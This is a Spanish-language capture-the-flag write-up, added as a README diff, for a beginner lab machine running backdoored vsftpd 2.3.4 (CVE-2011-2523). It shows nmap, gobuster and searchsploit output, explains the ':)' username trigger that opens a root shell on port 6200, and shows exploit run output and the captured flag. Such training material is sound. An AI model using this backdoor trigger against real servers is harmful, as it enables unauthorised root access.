@@ -1,0 +1,224 @@
+# Máquina Vulnerable: Tproot
+|                   | Detalle maquina original                        |
+| ----------------- | ----------------------------------------------- |
+| Autor             | [d1se0](https://github.com/D1se0) |
+| Dificultad        | Muy Fácil                                       |
+| Fecha de creación | 10/02/2025                                      |
+| Fecha del writeup | 10/12/2025                                      |
+| Maquina original  | Tproot                                          |
+| CVE               | CVE-2011-2523                                   |
+
+Máquina CTF diseñada como introducción al pentesting, enfocada en la explotación de servicios vulnerables conocidos. Esta réplica implementa la versión comprometida de vsftpd 2.3.4, que contiene una backdoor histórica descubierta en 2011, junto con un servidor web Apache.
+
+El objetivo es practicar la metodología básica de pentesting: reconocimiento con herramientas de escaneo (nmap), identificación de vulnerabilidades conocidas, y explotación mediante scripts personalizados. La máquina ofrece acceso root inmediato tras la explotación exitosa, demostrando el impacto crítico de usar software desactualizado y comprometido. Ideal para principiantes que desean entender el flujo de trabajo básico de un test de penetración y la importancia de mantener sistemas actualizados.
+
+## Tabla de Contenidos
+
+- [Estructura del Proyecto](#estructura-del-proyecto)
+  - [Descripción de Archivos Principales](#descripción-de-archivos-principales)
+- [Explotación](#explotación)
+  - [Vulnerabilidades Implementadas](#vulnerabilidades-implementadas)
+    - [CVE-2011-2523: vsftpd 2.3.4 Backdoor](#cve-2011-2523-vsftpd-234-backdoor)
+  - [Seguridad Implementada](#seguridad-implementada)
+  - [Flags](#flags)
+- [Write-up Completo](#write-up-completo)
+  - [Diagrama de Ataque](#diagrama-de-ataque)
+  - [Paso 1: Reconocimiento - Escaneo de Puertos](#paso-1-reconocimiento---escaneo-de-puertos)
+  - [Paso 2: Enumeración Web](#paso-2-enumeración-web)
+  - [Paso 3: Busqueda de exploit con searchsploit](#paso-3-busqueda-de-exploit-con-searchsploit)
+  - [Paso 4: Explotación con Script Personalizado](#paso-4-explotación-con-script-personalizado)
+  - [Paso 5: Obtención de la flag](#paso-4-obtención-de-la-flag)
+- [Conclusión](#conclusión)
+---
+
+## Estructura de archivos
+```
+Tproot
+└── README.md               # Documentación del proyecto
+└── exploit_vsftpd.py       # Exploit creado con claude code
+```
+---
+
+## Explotación
+
+### Vulnerabilidades Implementadas
+
+#### CVE-2011-2523: vsftpd 2.3.4 Backdoor
+- **Descripción**: Versión comprometida de vsftpd que contiene una backdoor
+- **Vector de ataque**: Al enviar un nombre de usuario que termina en `:)`, se activa la backdoor que abre un shell en el puerto 6200
+- **Impacto**: Ejecución remota de código como usuario root
+- **Explotación**: Mediante script personalizado generado con Claude Code
+
+---
+
+## Write-up Completo
+
+### Diagrama de Ataque
+
+```mermaid
+graph TD
+    A[Inicio] --> B[Reconocimiento con nmap]
+    B --> C{Puertos 21 y 80<br/>abiertos?}
+    C -->|Sí| D[Identificar servicios:<br/>vsftpd 2.3.4 + Apache]
+    C -->|No| Z[Fin]
+    D --> E[Enumeración web<br/>con gobuster]
+    E --> F[Identificar CVE-2011-2523<br/>vsftpd backdoor]
+    F --> G[Generar exploit<br/>personalizado]
+    G --> H[Ejecutar exploit<br/>contra target]
+    H --> I{Exploit<br/>exitoso?}
+    I -->|Sí| J[Shell como root<br/>obtenido]
+    I -->|No| Z
+    J --> K[Leer flag en<br/>/root/root.txt]
+    K --> L[Compromiso completo]
+    L --> Z
+```
+
+### Paso 1: Reconocimiento - Escaneo de Puertos
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -p- -sV 172.17.0.2
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 21:19 EST
+Nmap scan report for 172.17.0.2
+Host is up (0.0000040s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
+```
+
+**Resultado**: Se identifican 2 puertos abiertos:
+- **Puerto 21 (FTP)**: vsftpd 2.3.4 (vulnerable a CVE-2011-2523)
+- **Puerto 80 (HTTP)**: Apache httpd 2.4.58
+
+### Paso 2: Enumeración Web
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html | grep "(Status: 200)"
+/index.html           (Status: 200) [Size: 10671]
+```
+
+**Resultado**: Solo se encuentra la página index.html por defecto, sin directorios o archivos interesantes adicionales.
+
+
+
+### Paso 3: Busqueda de exploit con searchsploit
+```bash
+┌──(kali㉿kali)-[~]
+└─$ searchsploit vsftpd 2.3.4
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                               | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                  | unix/remote/17491.rb
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+### Paso 4: Explotación con Script Personalizado
+#### Exploit generado con Claude Code
+
+#### Diagrama de Flujo del Exploit
+
+```mermaid
+sequenceDiagram
+    participant Atacante
+    participant FTP as vsftpd 2.3.4<br/>(Puerto 21)
+    participant Backdoor as Shell Backdoor<br/>(Puerto 6200)
+
+    Note over Atacante: Inicio del Exploit
+    Atacante->>FTP: Conectar al servicio FTP
+    FTP-->>Atacante: Banner (220 vsFTPd 2.3.4)
+
+    Note over Atacante,FTP: Trigger del Backdoor
+    Atacante->>FTP: USER nergal:)<br/>(username con smiley)
+    FTP-->>Atacante: 331 Password required
+    Atacante->>FTP: PASS backdoor
+
+    Note over FTP: Backdoor activado<br/>Abre puerto 6200
+
+    Atacante->>FTP: Cerrar conexión FTP
+
+    Note over Atacante: Esperar 2 segundos
+
+    Atacante->>Backdoor: Conectar al puerto 6200
+    Backdoor-->>Atacante: Conexión establecida
+
+    Note over Atacante,Backdoor: Shell Interactivo (Root)
+    Atacante->>Backdoor: id
+    Backdoor-->>Atacante: uid=0(root) gid=0(root)
+
+    loop Shell Interactivo
+        Atacante->>Backdoor: comando
+        Backdoor-->>Atacante: resultado
+    end
+
+    Atacante->>Backdoor: exit
+    Note over Atacante: Cerrar conexión
+```
+
+**Funcionamiento del Exploit:**
+
+1. **Conexión Inicial**: Se conecta al servicio FTP en el puerto 21
+2. **Trigger del Backdoor**: Envía un username que termina en `:)` (smiley face)
+3. **Activación**: El backdoor malicioso se activa y abre un shell en el puerto 6200
+4. **Shell Root**: Se obtiene acceso con privilegios de root
+5. **Interacción**: Shell interactivo para ejecutar comandos en el sistema comprometido
+
+#### Ejecución del Exploit
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ python exploit_vsftpd.py 172.17.0.2
+[*] Attempting to exploit vsftpd 2.3.4 on 172.17.0.2
+[*] FTP Port: 21, Backdoor Port: 6200
+[*] Connecting to FTP service...
+[+] Banner: 220 (vsFTPd 2.3.4)
+[*] Sending malicious USER command...
+[+] Response: 331 Please specify the password.
+[*] Sending PASS command...
+[*] No response (expected for backdoor)
+[*] Waiting for backdoor to open...
+[*] Attempting to connect to backdoor on port 6200...
+[+] SUCCESS! Backdoor shell opened!
+[+] You now have a root shell
+[*] Type commands (type 'exit' to quit)
+--------------------------------------------------
+```
+
+**Resultado**: Exploit exitoso, shell root obtenido ✓
+
+### Paso 5: Obtención de la flag
+
+```bash
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+cd /root
+ls
+root.txt
+cat root.txt
+261fd3f32200f950f231816b4e9a0594
+```
+
+**Resultado**: Flag capturada exitosamente ✓
+
+---
+
+## Conclusión
+
+Esta máquina demuestra la importancia de mantener el software actualizado. La versión vsftpd 2.3.4 fue comprometida en 2011 y contiene una backdoor que permite acceso root inmediato sin autenticación.
+
+**Lecciones aprendidas:**
+1. **Gestión de versiones**: Usar versiones vulnerables de software puede comprometer completamente un sistema
+2. **Reconocimiento completo**: Un escaneo exhaustivo con nmap y enumeración web proporciona el contexto completo del sistema
+3. **Exploits personalizados**: Desarrollo de scripts de explotación adaptados a necesidades específicas
+4. **Acceso inmediato a root**: Esta backdoor bypasea completamente cualquier mecanismo de autenticación
+5. **Importancia de actualizaciones**: La backdoor fue descubierta y corregida en 2011, usar software desactualizado es extremadamente peligroso
+6. **Múltiples vectores**: Aunque hay múltiples servicios expuestos, una sola vulnerabilidad crítica es suficiente para comprometer el sistema completo
